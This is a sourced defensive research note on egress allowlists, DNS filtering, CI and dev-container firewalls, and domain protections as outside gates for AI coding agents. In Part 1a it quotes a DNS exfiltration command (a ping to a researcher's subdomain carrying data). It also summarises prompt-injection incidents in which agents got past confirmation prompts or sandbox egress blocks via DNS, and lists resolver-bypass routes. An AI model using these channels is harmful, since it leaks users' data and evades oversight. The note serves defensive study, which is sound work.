# Network and DNS controls as outside gates for coding agents

State as of 2026-10-07. All sources below were fetched on 2026-10-07. Vendor
product facts (Claude Code cloud environments, Codex cloud, Copilot coding
agent firewall, harden-runner) are date-sensitive; standards (RFCs, NIST,
ICANN EPP codes) are stable.

Repo baseline (from `docs/vendors/*/permissions-and-sandbox.md`, not re-verified
here): Claude Code's local sandbox routes Bash through an HTTP/SOCKS proxy with
a hostname allowlist (initially empty), blocks non-HTTP tools and UDP/QUIC/ICMP,
but the allowlist lives in settings the agent or a PR may touch unless
admin-required/managed. Codex `workspace-write` has network off by default; its
experimental proxy does not filter web search, connectors, MCP, browser, cloud
tasks or its own model/auth requests. OpenCode records no OS-level sandbox. The
repo's `docs/guide/security.md` already states "a domain allowlist does not
inspect payloads". What an outside control adds is enforcement that does not
live in agent-writable state and that covers every process, not only the
agent's shell tool.

## Part 1a: Egress allowlists, DNS filtering vs enforced egress, DNS exfiltration

### Takeaway
DNS filtering ("protective DNS") stops connections that start with a lookup
through the approved resolver, but it is not an egress boundary: data can leave
inside the DNS queries themselves, and clients can bypass the resolver via
direct IPs, outbound port 53, DoT/DoQ, or DoH on 443. Enforced egress needs a
default-deny firewall/proxy that also blocks unauthorized resolvers, plus DNS
monitoring for tunneling. Real agent incidents have used DNS subdomains as the
exfiltration channel even where HTTP egress was blocked.

### Cited Findings
- NIST describes protective DNS as "a DNS service that is enhanced with security capabilities to analyze DNS queries and responses and take action to mitigate threats" and notes "Because DNS queries precede network communication streams, enforcing policy with DNS prevents malicious or suspicious communication streams from starting." — [NIST SP 800-81r3 (March 2026), §2](https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-81r3.pdf)
- NIST on the limit: "Even when DNS traffic is encrypted, the system still needs to retain access to the internet. This allows malicious actors to set up authoritative servers for command and control (C2) and data exfiltration, where encryption can work to their advantage. Therefore, it is crucial to implement strict controls and auditing on an organization's secure resolvers to ensure that only resolvers with the appropriate policy configuration are permitted to communicate with the internet." — [NIST SP 800-81r3, §2](https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-81r3.pdf)
- Resolver bypass controls NIST recommends (§4.2.2): "Block outbound DNS from the internal network to the internet, except for name servers that are authorized to communicate directly with name servers on the internet"; "Block unauthorized DoT traffic … DoT is straightforward to block because it uses the well-known TCP port 853"; "DoH is more difficult to block because it uses the same TCP port as TLS: 443. RPZs can help block the resolution of the domain names used to identify known DoH servers, and firewall rules can block access to public DoH services that run on dedicated IP addresses"; also block DoQ (UDP 853). — [NIST SP 800-81r3, §4.2.2](https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-81r3.pdf)
- DNS exfiltration detection (§4.2.4): "Organizations should establish controls to detect and block unauthorized applications from tunneling data within DNS packets. Signature-based systems can detect well-known DNS tunneling tools, but customized DNS data exfiltration tools should also be considered." Indicators listed: "A larger than normal volume of queries from a host", "Unusual or changing pattern of queries", "Queries for seemingly odd QNAMES (detected by taking entropy measurments of QNAMEs)", known-malicious domains. Caveat: "Network-based tools that passively observe DNS traffic will be impacted by the use of encrypted DNS unless the tool is configured to act as a proxy or forwarder." — [NIST SP 800-81r3, §4.2.4](https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-81r3.pdf)
- Agent incident, DNS via auto-approved commands: GitHub advisory "Permissive Default Allowlist Enables Unauthorized File Read and Network Exfiltration in Claude Code": "Due to an overly broad allowlist of safe commands, it was possible to bypass the Claude Code confirmation prompts to read a file and then send file contents over the network without user confirmation. Reliably exploiting this requires the ability to add untrusted content into a Claude Code context window." Affected "< v1.0.4", patched v1.0.4, CVE-2025-55284, CVSS 7.1, published Aug 15, 2025. — [GHSA-x5gv-jw7f-j6xj](https://github.com/anthropics/claude-code/security/advisories/GHSA-x5gv-jw7f-j6xj)
- The researcher's write-up shows the channel: `ping -c 2 stuff.wuzzi.net` with data placed in the subdomain; the commands not requiring approval were `ping`, `nslookup`, `dig` and `host`; reported May 26, 2025. — [Embrace The Red](https://embracethered.com/blog/posts/2025/claude-code-exfiltration-via-dns-requests/)
- [Practitioner — first-hand security research; zenity.io not yet in sources.md tables] In Claude's (claude.ai) code-execution sandbox, despite HTTP/HTTPS egress blocking, "DNS resolution happens before those filters can intervene"; chat content "can all be smuggled out inside subdomain queries"; the researchers built a bidirectional shell (commands via TXT records, output as base32 subdomain queries). Timeline per the authors: reported Nov 28, 2025; "DNS channel was confirmed closed" Dec 12, 2025; reappeared May 29, 2026 and marked a duplicate. Recommendation: "Don't underestimate DNS. An open channel to the outside world is always a risk." — [Zenity Labs](https://labs.zenity.io/post/it-s-always-dns-in-claude-s-sandbox-from-data-exfiltration-to-a-bidirectional-dns-shell)
- Allowlists do not inspect payloads: Codex cloud docs list risks of agent internet access including "Prompt injection from untrusted web content" and "Code or secret exfiltration", and offer restricting requests to `GET`, `HEAD`, `OPTIONS` (blocking `POST`, `PUT`, `PATCH`, `DELETE`). — [Codex cloud internet access](https://learn.chatgpt.com/docs/cloud/internet-access) (redirect target of developers.openai.com/codex/cloud/internet-access)
- Allowlisted user-content hosts: Claude Code cloud's default **Trusted** list includes `gist.github.com`, `raw.githubusercontent.com`, `gitlab.com`, `bitbucket.org` and package registries such as `registry.npmjs.org`. — [Claude Code cloud environments, default allowed domains](https://code.claude.com/docs/en/cloud-environments)

### Inferences
- [Inference] DNS filtering alone is a guardrail against honest mistakes (agent fetches a typo-squatted or malicious domain) and a detection/telemetry source; it is not an exfiltration boundary, because the query name itself carries data to any authoritative server the attacker controls, and because a process can skip the resolver.
- [Inference] An enforced egress boundary therefore needs: (1) default-deny at the IP/port layer outside the agent's environment, (2) only an approved resolver/forwarder allowed out, with port 53/853 and known DoH endpoints blocked, (3) either no general DNS resolution for the sandbox (a proxy resolves names on its behalf, as the Claude Code local sandbox's proxy design implies) or resolver logging with tunneling detection.
- [Inference] GET-only restrictions narrow but do not close exfiltration: data can be placed in URL paths, query strings or search arguments of a GET (the repo already cites OpenAI on read-only search disclosing data via query arguments).
- [Inference] Any allowlisted host that accepts user content (gists, issues/PR comments, package publishing, pastebins on allowed CDNs) is a write channel to the internet; allowlisting `github.com` or `gist.github.com` with a write-capable credential nullifies the allowlist for confidentiality. Against prompt injection, the allowlist only shrinks the set of channels; against honest mistakes it is very effective.

### Gaps
- No peer-reviewed DNS-exfiltration paper was fetched; the evidence here is NIST guidance plus two first-hand agent incident reports.
- CISA protective-DNS and encrypted-DNS guidance pages were not fetched; OWASP pages on egress were not fetched.

## Part 1b: Network controls for CI runners and agent dev environments/containers

### Takeaway
For CI, egress policy can be applied on the runner (harden-runner style: audit then block with a domain allowlist) or by placing runners in a network-isolated segment; for local dev, a container with a firewall outside the agent's control. In both cases the control is only an outside gate if the agent cannot edit or disable it (a Dockerfile or workflow in the repo is PR-changeable).

### Cited Findings
- harden-runner: "Harden-Runner is a CI/CD security agent that works like an EDR for GitHub Actions runners. It monitors network egress, file integrity, and process activity on those runners"; it supports audit and block modes, "Block Network Egress Traffic with Domain Allowlist", and "Automated Baseline Creation" where it "builds a baseline for each job based on past outbound network connections". Limits stated: GitHub-hosted Windows/macOS runners "Audit mode only"; "Self-hosted runners require an Enterprise subscription, even for public repositories. Without a subscription, the Harden-Runner action is a no-op on self-hosted runners." The README lists detections including the tj-actions/changed-files compromise. — [step-security/harden-runner README](https://github.com/step-security/harden-runner)
- Claude Code dev container: the reference `init-firewall.sh` "limits outbound traffic to the destinations the script allows"; it needs `NET_ADMIN` and `NET_RAW`. Warning: "When executed with `--dangerously-skip-permissions`, dev containers do not prevent a malicious project from exfiltrating anything accessible inside the container, including the Claude Code credentials stored in `~/.claude`." And: "Because the Dockerfile lives in the repository, anyone with write access can change or remove this step. For policy that engineers cannot bypass by editing repository files, deliver managed settings through server-managed settings or your MDM instead." Pairing bypass mode with egress limits: "Pair this flag with the network egress restrictions above to limit what a bypassed session can reach." — [Claude Code dev containers](https://code.claude.com/docs/en/devcontainer)
- Gate for deploy-capable CI jobs: GitHub environments with required reviewers; "If the environment requires approval, a job cannot access environment secrets until one of the required reviewers approves it"; option to prevent self-review: "users who initiate a deployment cannot approve the deployment job, even if they are a required reviewer"; deployment branch restriction "Protected branches only". — [GitHub deployments and environments](https://docs.github.com/en/actions/reference/workflows-and-actions/deployments-and-environments)

### Inferences
- [Inference] A firewall started by a repo-controlled script (dev container `postStartCommand`, a workflow step) is an outside gate against the agent's runtime actions but not against a PR that edits it; it becomes a real outside gate only if the network policy is enforced by infrastructure the repo cannot change (host firewall, VPC egress rules, org-level runner groups, managed proxy).
- [Inference] harden-runner in a workflow file is similarly PR-editable; for agent-authored PRs, the protection depends on branch protection / required workflows that the agent's token cannot alter.

### Gaps
- harden-runner's separate limitations page (container jobs, sudo, Docker) was not fetched.
- GitHub "network-isolated"/private-networking runners docs were not fetched.

## Part 1c: What coding-agent vendors document about cloud-agent network isolation

### Takeaway
All three hosted agents checked default to restricted egress, but each documents channels that bypass the allowlist (model API, connectors, GitHub proxy, setup steps, MCP), and GitHub explicitly says its firewall is not comprehensive. A hosted allowlist is a vendor-operated outside gate for the agent VM, configured by humans in a console rather than in the repo.

### Cited Findings
- Claude Code cloud: access levels "None", "Trusted" (default: "package registries, GitHub, cloud SDKs"), "Full", "Custom". "Whichever level you pick, sessions can still reach these, because each one takes a path that doesn't go through the session's network allowlist": GitHub through its separate proxy, enabled MCP connectors ("traffic travels through Anthropic's servers"), API-credential hosts, and "The Anthropic API, for Claude Code's own requests, even at None". — [Cloud environments](https://code.claude.com/docs/en/cloud-environments)
- Claude Code cloud: "When running with network access disabled, Claude Code can still communicate with the Anthropic API, which may allow data to exit the VM." In self-hosted environments "you restrict session egress at your own network boundary." — [Claude Code in the cloud, Security and isolation](https://code.claude.com/docs/en/claude-code-on-the-web)
- Claude Code cloud security proxy: "All outbound internet traffic from an Anthropic-hosted session passes through this proxy", providing among others "A DNS-level audit trail of requested hostnames". GitHub proxy: "the proxy rejects branch deletions and pushes of anything other than a branch, such as a tag. It doesn't limit which branches a push can update. To do that, use branch protection rules or rulesets on GitHub." — [Cloud environments](https://code.claude.com/docs/en/cloud-environments)
- Claude Code cloud allowlists are per environment: "there's no organization-level allowlist that admins can push to every member's environments. No server-managed setting adds domains to an environment's network allowlist either." — [Cloud environments](https://code.claude.com/docs/en/cloud-environments)
- Codex cloud: "setup scripts still run with internet access so you can install dependencies"; agent-phase internet off by default; per-environment domain allowlist (None / "Common dependencies" preset / All) and optional HTTP method restriction. Documentation illustrates prompt injection via hidden instructions in a GitHub issue leading to data being leaked. — [Codex cloud internet access](https://learn.chatgpt.com/docs/cloud/internet-access)
- GitHub Copilot coding agent: "By default, Copilot's access to the internet is limited by a firewall"; recommended allowlist enabled by default (OS package repos, container registries, language package registries, CAs, Playwright browser hosts). Limits: "The firewall only applies to processes started by the agent via its Bash tool. It does not apply directly to Model Context Protocol (MCP) server processes or processes started in configured Copilot setup steps." "Sophisticated attacks may bypass the firewall, potentially allowing unauthorized network access and data exfiltration." It "should not be considered a comprehensive security solution." — [Customize the agent firewall](https://docs.github.com/en/copilot/how-tos/use-copilot-agents/coding-agent/customize-the-agent-firewall)

### Inferences
- [Inference] Hosted allowlists close generic exfiltration to arbitrary hosts but leave the vendor's own model/connector channels and the code host (GitHub) open; branch protection/rulesets on the code host are the complementary outside gate the vendor itself points to.
- [Inference] Because the default Trusted lists include user-content hosts (e.g. `gist.github.com`), "Trusted" should be read as "trusted not to serve malware", not "safe as a destination for secrets".

### Gaps
- Whether the learn.chatgpt.com page reflects current (non-legacy) Codex cloud behavior was not confirmed.
- No vendor documents DNS handling inside its hosted VM in detail beyond Anthropic's "DNS-level audit trail".

## Part 2: Protecting domain and DNS infrastructure from an agent with infra access

### Takeaway
Gates (prevent): registry lock (server* EPP statuses, set by the registry, changed out of band), registrar lock (client* statuses — removable by whoever holds the registrar account), separate accounts/roles with MFA for DNS changes, and IaC plan/apply with an approval the agent cannot give. Constraints on third parties, not on the zone owner: CAA (only binds compliant CAs) and DNSSEC (authenticates whatever the authorized signer publishes, so it does not stop an authorized-but-wrong change). Detection: record audits, CT-log monitoring, DMARC reports, dangling-record checks. SPF/DKIM/DMARC and CAA are themselves DNS assets an agent could break or subvert.

### Cited Findings
- EPP client statuses are "Set by Registrar": `clientTransferProhibited` "tells your domain's registry to reject requests to transfer the domain"; `clientUpdateProhibited` "can help prevent unauthorized updates resulting from fraud"; `clientDeleteProhibited` likewise for deletions. Server statuses are "Set by Registry": `serverUpdateProhibited` "locks your domain preventing it from being updated", and "some Registry Operators offer a Registry Lock Service that allows registrants, through their registrars to set this status as an extra protection against unauthorized updates" (same wording for transfers and deletions). — [ICANN EPP status codes](https://www.icann.org/resources/pages/epp-status-codes-2014-06-16-en)
- Account compromise is the documented attack path: "The attacker begins by compromising user credentials, or obtaining them through alternate means, of an account that can make changes to DNS records." "Because the attacker can set DNS record values, they can also obtain valid encryption certificates for an organization's domain names." Required actions included: audit public DNS records "to verify they resolve to the intended location"; "Implement multi-factor authentication (MFA) for all accounts on systems that can make changes to your agency's DNS records"; "immediately begin monitoring CT log data for certificates issued that they did not request." Issued January 22, 2019. — [CISA ED 19-01](https://www.cisa.gov/news-events/directives/ed-19-01-mitigate-dns-infrastructure-tampering)
- DNSSEC scope: "The Domain Name System Security Extensions (DNSSEC) add data origin authentication and data integrity to the Domain Name System." "DNSSEC is not designed to provide confidentiality, access control lists, or other means of differentiating between inquirers." "DNSSEC provides no protection against denial of service attacks." Operational risk: "enabling DNSSEC signature validation in a resolver may cause entire legitimate zones to become effectively unreachable due to DNSSEC configuration errors or bugs." — [RFC 4033](https://www.rfc-editor.org/rfc/rfc4033)
- CAA: "allows a DNS domain name holder to specify one or more Certification Authorities (CAs) authorized to issue certificates for that domain name"; "Before issuing a certificate, a compliant CA MUST check for publication of a Relevant RRset"; "Relying Parties MUST NOT use CAA records as part of certificate validation"; "The use of DNSSEC to authenticate CAA RRs is strongly RECOMMENDED but not required"; "Suppression of a CAA record or insertion of a bogus CAA record could enable an attacker to obtain a certificate from an Issuer that was not authorized to issue for an affected FQDN." `iodef` specifies where violation reports go. — [RFC 8659](https://www.rfc-editor.org/rfc/rfc8659)
- DMARC policies: `p=none` "requests no specific action", `quarantine` "be treated by Mail Receivers as suspicious", `reject` "wishes for Mail Receivers to reject email that fails the DMARC mechanism check". "The DMARC mechanism and its underlying technologies (SPF, DKIM) depend on the security of the DNS." On failure reports: "the addresses shown in the 'ruf' tag receive more information that might be considered private data, since it is possible for actual email content to appear in the failure reports … attacking the DNS of the subject domain to cause failure data to be routed fraudulently to an attacker's systems may be an attractive prospect." — [RFC 7489](https://www.rfc-editor.org/rfc/rfc7489)
- NIST notes SPF, DKIM and DMARC "use TXT RRs to store email sender policy information, such as valid email senders for a domain". — [NIST SP 800-81r3, §3.5](https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-81r3.pdf)
- Dangling records (an infra agent deleting a resource but not its record): "CNAME records can also be exploited if the canonical name resolves to an IP address that is no longer in use by the domain owner, and the attacker can gain control of that IP address"; "When they are no longer required, CNAME records should be deleted." Lame delegations: "A lame delegation can result in domain hijacking"; "Domain administrators should follow a deletion procedure that involves removing all delegation information and the zone data itself." — [NIST SP 800-81r3, §3.6](https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-81r3.pdf)
- NIST SP 800-81r3 frames DNS guidance as "an additional layer of network security as part of a zero trust and/or defense-in-depth security risk management approach"; published March 2026. — [NIST SP 800-81r3 landing page](https://csrc.nist.gov/pubs/sp/800/81/r3/final)
- Approval gate for IaC apply in CI: GitHub environments: "If the environment requires approval, a job cannot access environment secrets until one of the required reviewers approves it", with an option so "users who initiate a deployment cannot approve the deployment job". — [GitHub deployments and environments](https://docs.github.com/en/actions/reference/workflows-and-actions/deployments-and-environments)
- Comment-triggered IaC is a bypass risk: Claude Code docs warn that with auto-fix, "Claude can reply on your behalf, which can trigger those workflows" (Atlantis, Terraform Cloud, `issue_comment` Actions), and suggest "disabling auto-fix for repositories where a PR comment can deploy infrastructure or run privileged operations." — [Claude Code in the cloud, auto-fix](https://code.claude.com/docs/en/claude-code-on-the-web)

### Gate vs detection classification
- Gate (prevent): registry lock (server* statuses; change requires the registry/registrar out-of-band process) — [ICANN EPP](https://www.icann.org/resources/pages/epp-status-codes-2014-06-16-en); separate DNS/registrar accounts with MFA that the agent's credentials do not include — [CISA ED 19-01](https://www.cisa.gov/news-events/directives/ed-19-01-mitigate-dns-infrastructure-tampering); IaC apply behind required reviewers with self-review prevented, secrets released only after approval — [GitHub environments](https://docs.github.com/en/actions/reference/workflows-and-actions/deployments-and-environments).
- Weak gate: registrar lock (client* statuses) — [Inference] blocks transfers/updates only until someone with the registrar account removes it; if the agent's credential can reach the registrar API, it can remove it.
- Third-party constraint, not owner-side gate: CAA (binds compliant CAs only; an agent with DNS write can rewrite CAA) — [RFC 8659](https://www.rfc-editor.org/rfc/rfc8659); DNSSEC (integrity in transit; an authorized zone change is signed like any other) — [RFC 4033](https://www.rfc-editor.org/rfc/rfc4033).
- Detection: public-record audits and CT log monitoring — [CISA ED 19-01](https://www.cisa.gov/news-events/directives/ed-19-01-mitigate-dns-infrastructure-tampering); DMARC aggregate/failure reports and CAA `iodef` reports — [RFC 7489](https://www.rfc-editor.org/rfc/rfc7489), [RFC 8659](https://www.rfc-editor.org/rfc/rfc8659); dangling CNAME/lame-delegation monitoring — [NIST SP 800-81r3](https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-81r3.pdf).

### Inferences
- [Inference] DNS records an agent could plausibly break while doing "routine" infra work: NS/DS (whole-domain outage, and with DNSSEC a bad DS makes the zone fail validation per RFC 4033's "effectively unreachable"), MX/SPF/DKIM/DMARC (mail loss or spoofability; a `ruf=` edit redirects failure reports that may contain mail content), CAA (unlocks issuance by other CAs), and CNAMEs left dangling after deleting cloud resources (subdomain takeover).
- [Inference] The strongest pattern for an agent with infra access is: agent proposes DNS changes as IaC in a PR; plan runs with read-only credentials; apply uses a credential held only by a protected environment whose approval the agent's identity cannot give; registrar/registry-level changes (NS, DS, transfer) stay outside IaC entirely behind registry lock and a separate human account.
- [Inference] DNSSEC and CAA do not need anything in the harness; they protect against third parties, not against the agent, and become assets the agent must not edit.

### Gaps
- No registry operator's own registry-lock procedure page was successfully fetched (Verisign URL returned only its homepage), so the out-of-band unlock mechanics are not sourced here beyond ICANN's description.
- DMARCbis (successor to RFC 7489) status was not checked; RFC 7489 is cited.
- Terraform/HashiCorp docs on plan/apply approval and Sentinel/OPA policy were not fetched.

## Complement vs replace (harness mechanism vs outside gate)

### Takeaway
Outside network/DNS gates replace harness work when the rule must hold under compromise (no secrets leave, no DNS change without a human); harness mechanisms then become only friction-reducers and early warnings. They complement the harness when the rule is about intent or task scope, which a network layer cannot see.

### Cited Findings
- Vendor-stated limits of in-harness or agent-scoped controls: Copilot firewall applies only to the Bash tool's processes and "should not be considered a comprehensive security solution" — [GitHub](https://docs.github.com/en/copilot/how-tos/use-copilot-agents/coding-agent/customize-the-agent-firewall); repo-shipped container policy can be changed by "anyone with write access" — [Claude Code dev containers](https://code.claude.com/docs/en/devcontainer); auto-approved command allowlists in the harness were the exfiltration path in CVE-2025-55284 — [GHSA-x5gv-jw7f-j6xj](https://github.com/anthropics/claude-code/security/advisories/GHSA-x5gv-jw7f-j6xj).
- Claude Code's GitHub proxy explicitly defers branch-scope control to the code host: "use branch protection rules or rulesets on GitHub." — [Cloud environments](https://code.claude.com/docs/en/cloud-environments)

### Inferences
- [Inference] Replace (build nothing in the harness beyond, at most, an instruction explaining the boundary): "no data leaves except to X" for untrusted-input agents → default-deny egress outside the agent's environment plus resolver control; "DNS/registrar changes need a human" → separate credentials, registry lock, protected-environment apply. Harness rules here would duplicate a stronger gate and can be edited by the agent or a PR.
- [Inference] Complement: harness sandbox allowlist + permission ask-rules for network commands give fast, per-action feedback and fewer wasted runs (honest-mistake prevention); the outside egress gate is the backstop under prompt injection. Harness instructions/skills explain which domains exist and why, so the agent does not fight the gate.
- [Inference] Outside gate insufficient on its own: when the allowlist must include a user-content host (GitHub, gists, package registries) the gate cannot stop exfiltration there; pair it with scoped credentials (read-only or repo-scoped tokens, the vendor proxies' push restrictions) and separation of untrusted-content readers from secret holders, as the repo's security guide already recommends.
- [Inference] Nothing needed in the harness: DNSSEC, CAA, DMARC policy and CT monitoring are domain-level hygiene unrelated to agent behavior; the harness-relevant part is only "the agent's credentials must not be able to edit these records".

### Gaps
- No vendor or standard source was found that addresses agent-specific DNS/registrar access patterns directly; the mapping above is inference from general DNS security guidance.
